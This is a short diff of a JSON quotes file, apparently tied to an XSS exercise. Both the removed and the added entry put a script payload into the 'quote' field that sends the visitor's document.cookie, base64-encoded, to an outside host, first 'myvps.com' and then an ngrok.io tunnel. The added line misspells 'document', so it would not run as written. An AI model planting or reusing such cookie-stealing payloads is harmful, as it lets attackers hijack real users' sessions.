@@ -1,1 +1,1 @@
-[{"id":1,"quote": "<script> <img src='http://myvps.com/?data?cookie= + btoa(document.cookie) + '" /></script>","author":"PwnFunction"}]
+[{"id":1,"quote": "<script> doucment.location.href = 'https://67a8c0aaff90.ngrok.io?data?cookie=' + btoa(document.cookie) </script>","author":"PwnFunction"}]
